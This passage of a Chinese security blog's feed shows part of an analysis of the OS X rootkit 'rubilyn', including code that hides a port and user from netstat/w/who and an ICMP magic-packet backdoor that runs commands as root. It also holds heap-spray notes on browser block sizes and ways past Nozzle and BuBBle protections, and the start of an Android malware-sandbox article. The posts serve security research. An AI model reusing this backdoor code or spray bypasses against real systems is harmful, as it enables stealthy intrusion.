class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, netstat,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bzero(buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;cbuf, buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(my_strstr(buffer, (char*)&amp;amp;k_port))	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(uap-&amp;gt;nbyte);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((strncmp(p-&amp;gt;p_comm,w,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;||strncmp(p-&amp;gt;p_comm,who,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bzero(buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;cbuf, buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(my_strstr(buffer, (char*)&amp;amp;k_user))	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(uap-&amp;gt;nbyte);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return org_write_nocancel(p,uap,retval);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5、设置ICMP 后门&lt;/p&gt;
&lt;p&gt;首先添加IPv4过滤器ip_filter_ipv4：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;/* install IPv4 filter hook */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; ipf_addv4(&amp;amp;ip_filter_ipv4, &amp;amp;ip_filter_ipv4_ref);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ip_filter_ipv4结构如下：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; ipf_filter ip_filter_ipv4 = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.name		= &lt;span class=&quot;string&quot;&gt;&quot;rubilyn&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.ipf_input	= ipf_input,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.ipf_output	= ipf_output,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.ipf_detach	= ipf_detach,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当传给用户的ICMP数据包中包含有以下特定数据时就以root权限执行命令：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* ICMP backdoor configuration */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_TYPE 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_CODE 255 &lt;span class=&quot;comment&quot;&gt;/* xor&#39;d magic word*/&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_STR &lt;span class=&quot;string&quot;&gt;&quot;\x27\x10\x3\xb\x46\x8\x1c\x10\x1e&quot;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;// 解密后为“n0mn0mn0m”&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_STR_LEN 9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ipf_input主要处理传给用户的数据：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; errno_t &lt;span class=&quot;title&quot;&gt;ipf_input&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;* cookie, mbuf_t *data, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; offset, u_int8_t protocol)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; buf[IP_BUF_SIZE];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; icmp *icmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!(data &amp;amp;&amp;amp; *data))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (protocol != IPPROTO_ICMP)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    mbuf_copydata(*data, offset, IP_BUF_SIZE, buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    icmp = (struct icmp *)&amp;amp;buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 检测接收的icmp数据包中是否包含后门的特征数据，若是则调用KUNCExecute函数执行命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(icmp-&amp;gt;icmp_type==MAGIC_ICMP_TYPE&amp;amp;&amp;amp;icmp-&amp;gt;icmp_code== MAGIC_ICMP_CODE &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(icmp-&amp;gt;icmp_data, icmpstr, MAGIC_ICMP_STR_LEN)==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        my_KUNCExecute((char*)&amp;amp;k_cmd, kOpenAppAsRoot, kOpenApplicationPath);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;rubilyn还有个命令行控制台rubilyncon，通过输入参数选项来执行上面某项功能，主要都是通过sysctl控制内核变量来招待相应函数，这些内核变量都是在rubilyn中用sysctl注册的，通过这些内核变量可从用户层直接与rubilyn内核扩展进行交互来执行恶意操作。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、隐藏进程&quot;&gt;&lt;a href=&quot;#1、隐藏进程&quot; class=&quot;headerlink&quot; title=&quot;1、隐藏进程&quot;&gt;&lt;/a&gt;1、隐藏进程&lt;/h3&gt;&lt;p&gt;在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="OSX" scheme="http://riusksk.github.io/tags/OSX/"/>
    
      <category term="rootkit" scheme="http://riusksk.github.io/tags/rootkit/"/>
    
  </entry>
  
  <entry>
    <title>Heap Spray 技术要点</title>
    <link href="http://riusksk.github.io/2012/10/09/Heap-Spray-%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9/"/>
    <id>http://riusksk.github.io/2012/10/09/Heap-Spray-技术要点/</id>
    <published>2012-10-08T16:00:00.000Z</published>
    <updated>2016-06-24T14:30:27.000Z</updated>
    
    <content type="html">&lt;p&gt;1、堆喷射堆块大小 ≈ 程序堆块分配大小，以减小堆空隙大小。&lt;/p&gt;
&lt;p&gt;2、不能使用堆缓存块，否则可能破坏地址的可预测性，可通过申请6块相应大小的堆块来清空缓存。&lt;/p&gt;
&lt;p&gt;3、精确定位ROP地址，目标地址如&lt;code&gt;0x0c0c0c0c&lt;/code&gt;至堆块数据起始地址的&lt;code&gt;offset = ( 0x0c0c0c0c - UserPtr（堆数据起始地址）)/2，IE7：0x5FA，IE8：0x5F4/0x5F6，IE9：0x5FC/0x5FE，Firefox9：0x606&lt;/code&gt;，可能不同语言版本会存在偏差。&lt;/p&gt;
&lt;p&gt;4、不同系统、不同浏览器版本喷射块大小：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;XP SP3 – IE7    block = shellcode.substring(2,0x10000-0×21);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XP SP3 – IE8    block = shellcode.substring(2, 0x40000-0×21);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Vista SP2 – IE7  block = shellcode.substring(0, (0x40000-6)/2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Vista SP2 – IE8  block = shellcode.substring(0, (0x40000-6)/2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Win7 – IE8    block = shellcode.substring(0, (0x80000-6)/2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Vista/Win7 – IE9  block = shellcode.substring(0, (0x40000-6)/2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XP SP3/VISTA SP2/WIN7 - Firefox9  block = shellcode.substring(0, (0x40000-6)/2);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5、&lt;code&gt;Nozzle&lt;/code&gt;保护机制（IE）：检测是否存在重复可转换成汇编代码的字段，若存在则阻止其内存申请。&lt;/p&gt;
&lt;p&gt;6、&lt;code&gt;BuBBle&lt;/code&gt;保护机制（Firefox）：检测JavaScript是否尝试重复申请 &lt;code&gt;NOPs + shellcode (padding + rop chain + shellcode + padding)&lt;/code&gt;的内存块，若发现包含这些字段则阻止其内存申请。&lt;/p&gt;
&lt;p&gt;7、分配 &lt;code&gt;随机数 + rop + shellcode + 随机数&lt;/code&gt; 的堆块，以保证各分配块都是不同的，以此绕过上述保护机制，主要针对IE9。&lt;/p&gt;
&lt;p&gt;8、利用&lt;code&gt;随机变量名 + 随机块&lt;/code&gt;绕过 Firefox9 的保护。&lt;/p&gt;
&lt;p&gt;9、&lt;code&gt;HTML5 Heap Spray&lt;/code&gt;：EUSecWest2012上的演讲主题，通杀Chrome、Firefox、IE9和Safari&lt;br&gt;a、利用&lt;code&gt;canvas&lt;/code&gt;标签定义图形，通过脚本控制每个像素的数据再进行喷射；&lt;br&gt;b、利用&lt;code&gt;Web Worker&lt;/code&gt;的多线程功能，加速堆喷射过程，但IE不支持Worker.&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;1、堆喷射堆块大小 ≈ 程序堆块分配大小，以减小堆空隙大小。&lt;/p&gt;
&lt;p&gt;2、不能使用堆缓存块，否则可能破坏地址的可预测性，可通过申请6块相应大小的堆块来清空缓存。&lt;/p&gt;
&lt;p&gt;3、精确定位ROP地址，目标地址如&lt;code&gt;0x0c0c0c0c&lt;/code&gt;至堆块数据起
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Heap Spray" scheme="http://riusksk.github.io/tags/Heap-Spray/"/>
    
  </entry>
  
  <entry>
    <title>Android恶意软件沙盒自动化分析原理与实现</title>
    <link href="http://riusksk.github.io/2012/10/02/android_malware_sandbox/"/>
    <id>http://riusksk.github.io/2012/10/02/android_malware_sandbox/</id>
    <published>2012-10-01T16:00:00.000Z</published>
    <updated>2016-06-20T10:16:00.000Z</updated>
    
    <content type="html">&lt;p&gt;【作者】：riusksk（泉哥）&lt;br&gt;【团队】：腾讯安全应急响应中心&lt;br&gt;【日期】：2012年10月2日&lt;/p&gt;
&lt;h3 id=&quot;一、-前言&quot;&gt;&lt;a href=&quot;#一、-前言&quot; class=&quot;headerlink&quot; title=&quot;一、    前言&quot;&gt;&lt;/a&gt;一、    前言&lt;/h3&gt;&lt;p&gt;据网秦发布的《2012年上半年全球手机安全报告》，2012年上半年Android病毒感染量增长迅猛，尤以5、6月最为突出，上半年感染手机1283万部，比2011年下半年增长62%。在全球范围内，中国大陆地区被感染率占居首位。面对增长如此迅速的Android软件，安全研究人员常常需要逆向分析样本，分析出其恶意行为，但手工分析较费时间。在DEX文件反混淆技术的不遍推广和普及下，比如今年的BlackHat就有DEX反混淆的专题及相应工具公布，现在已有很多恶意软件使用到这些反混淆技术，这就加大了样本分析的难度及所花费的时间。本文主要讲述如何利用Android沙盘实现自动化分析恶意软件的方法，其中介绍了Android沙盘的原理，以及由笔者编写的Android沙盘——MalDroidAnalyzer，后面会提供由MalDroidAnalyzer分析真实病毒时自动生成的分析报告。&lt;/p&gt;
&lt;h3 id=&quot;二、-Android常见恶意软件行为&quot;&gt;&lt;a href=&quot;#二、-Android常见恶意软件行为&quot; class=&quot;headerlink&quot; title=&quot;二、    Android常见恶意软件行为&quot;&gt;&lt;/a&gt;二、    Android常见恶意软件行为&lt;/h3&gt;&lt;h4 id=&quot;1、-恶意扣费&quot;&gt;&lt;a href=&quot;#1、-恶意扣费&quot; class=&quot;headerlink&quot; title=&quot;1、    恶意扣费&quot;&gt;&lt;/a&gt;1、    恶意扣费&lt;/h4&gt;&lt;p&gt;病毒在后台发送扣费短信、拔打电话进行恶意扣费，同时会对服务商发回的服务短信进行屏蔽，破坏系统的正常功能，同时对用户造成资费损失。&lt;/p&gt;
&lt;h4 id=&quot;2、隐私窃取&quot;&gt;&lt;a href=&quot;#2、隐私窃取&quot; class=&quot;headerlink&quot; title=&quot;2、隐私窃取&quot;&gt;&lt;/a&gt;2、隐私窃取&lt;/h4&gt;&lt;p&gt;病毒通过后台服务窃取用户隐私信息，包括通话录音、短信内容、IMEI、IMSI、地理位置、通讯录、浏览器历史记录等信息，然后上传到黑客控制的远程服务器。&lt;/p&gt;
&lt;h4 id=&quot;3、远程控制&quot;&gt;&lt;a href=&quot;#3、远程控制&quot; class=&quot;headerlink&quot; title=&quot;3、远程控制&quot;&gt;&lt;/a&gt;3、远程控制&lt;/h4&gt;&lt;p&gt;病毒在后台开机自动，并与C&amp;amp;C服务器进行通讯，并从中获取加密的指令，解密后执行相应的恶意操作，也有通过SMS进行控制，构造出botnet，从而大规模地远程控制用户的手机。比如之前著名的AnserverBot病毒，就是通过新浪博客进行远程控制，也是首个利用第三方站点作为C&amp;amp;C服务器的Android病毒。&lt;/p&gt;
&lt;h4 id=&quot;4、系统破坏&quot;&gt;&lt;a href=&quot;#4、系统破坏&quot; class=&quot;headerlink&quot; title=&quot;4、系统破坏&quot;&gt;&lt;/a&gt;4、系统破坏&lt;/h4&gt;&lt;p&gt;病毒通过系统漏洞进行ROOT提权，并执行高权限操作，在后台静默安装子程序包，或者通过伪造成杀毒软件、提示更新等方式欺骗用户安装第三方恶意程序。病毒可能会更改网络状态、APN，或者替换系统文件、添加恶意书签、屏蔽运营商短信、中止杀软进程等方式进行系统破坏。&lt;/p&gt;
&lt;h4 id=&quot;5、其它&quot;&gt;&lt;a href=&quot;#5、其它&quot; class=&quot;headerlink&quot; title=&quot;5、其它&quot;&gt;&lt;/a&gt;5、其它&lt;/h4&gt;&lt;p&gt;病毒在后台联网下载大量软件，消耗用户手机流量，或者执行一些比较耗电的操作来消耗手机电量，进而影响正常的手机通信。也有些一些病毒通过钓鱼欺骗等方式，诱骗用户下载伪装软件，导致帐户密码失窃。&lt;/p&gt;
&lt;h3 id=&quot;三、-Android沙盘原理&quot;&gt;&lt;a href=&quot;#三、-Android沙盘原理&quot; class=&quot;headerlink&quot; title=&quot;三、    Android沙盘原理&quot;&gt;&lt;/a&gt;三、    Android沙盘原理&lt;/h3&gt;&lt;p&gt;本文主要介绍一款Android恶意软件行为自动分析平台——MalDroidAnalyzer，其主要结合静态分析和动态分析技术来实现恶意软件行为自动化分析。MalDroidAnalyzer是笔者使用Perl语言编写的，用于辅助分析Android软件行为，提高恶意软件的分析效率。&lt;/p&gt;
&lt;p&gt;首先，MalDroidAnalyzer直接以apk文件作为输入，整个分析过程主要分析两部分：静态分析和动态分析。静态分析会通过反编译apk文件，分析其中的权限、组件、敏感函数等信息，这些可以弥补动态分析中因未触发恶意行为而漏掉的行为。动态分析主要通过在模拟器运行Android软件，然后再对软件进行一些操作以触发尽可能多的恶意行为，接着输出到log中，再通过脚本对日志进行分析。由于Android系统默认情况下，一些输出日志里面缺乏我们所需的信息，比如发送短信时，只在log中记录手机号，而没有短信内容，此时就需要通过修改Android源码或者反汇编system.img中的相关类或者库进行修改，可以在短信发送函数sendTextMessage（位于system.img中的framework/framework.jar）里面添加短信内容的日志输出：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;下面是可能需要修改的相关文件，包括源码位置和编译后所对应的相关文件，可根据自身需要进行修改：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;发送短信：android.telephony.SmsManager（system.img中的framework/framework.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;文件操作：org.apache.harmony.luni.platform.OSFileSystem（system.img中的framework/core.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;网络操作：org.apache.harmony.luni.platform.OSNetworkSystem（system.img中的framework/core.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;拔打电话：android.app.Activity（system.img中的framework/framework.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;启动服务：android.content.ContextWrapper（system.img中的framework/framework.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;数据加解密：javax.crypto.Cipher（system.img中的framework/core.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;核心库：dalvik/vm/native（system.img中的lib/libdvm.so）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关于apk文件及MalDroidAnalyzer的工作流程如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/2.png&quot; alt=&quot;&quot;&gt; &lt;/p&gt;
&lt;h4 id=&quot;1、静态分析&quot;&gt;&lt;a href=&quot;#1、静态分析&quot; class=&quot;headerlink&quot; title=&quot;1、静态分析&quot;&gt;&lt;/a&gt;1、静态分析&lt;/h4&gt;&lt;p&gt;沙盘MalDroidAnalyzer主要在电脑端对APK进行静态分析，通过apktool先进行反编译处理。正常的APK文件主要是以zip格式进行压缩捆绑的文档，里面主要包含AndroidManifest.xml、Classes.dex和res等文件。在反编译后会得到明文的AndroidManifest.xml，里面定义各组件、组件权限和启动位置、软件基本信息等，通过对该xml文件的分析，可以获取到软件名称、包名等基本信息，同时对包含的各个组件进行分析，特别是Broadcast Receiver组件的触发条件，可能就包含有开机自启动项用于启动后台服务，这些在报告中都会被高亮显示出来。&lt;/p&gt;
&lt;p&gt;在动态分析过程中，可能由于恶意行为的时间限制，或者模拟器的功能限制（比如蓝牙、Wifi），导致病毒的一些恶意行为无法触发。此时，我们通过检测Android软件调用的API函数可弥补这里的不足，比如发送扣费短信通常会调用sendTextMessage()函数，执行外部命令可能会调用java.lang.Runtime.exec()。下面是笔者收集整理的一些敏感API函数列表，欢迎各位读者补充和改进：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span 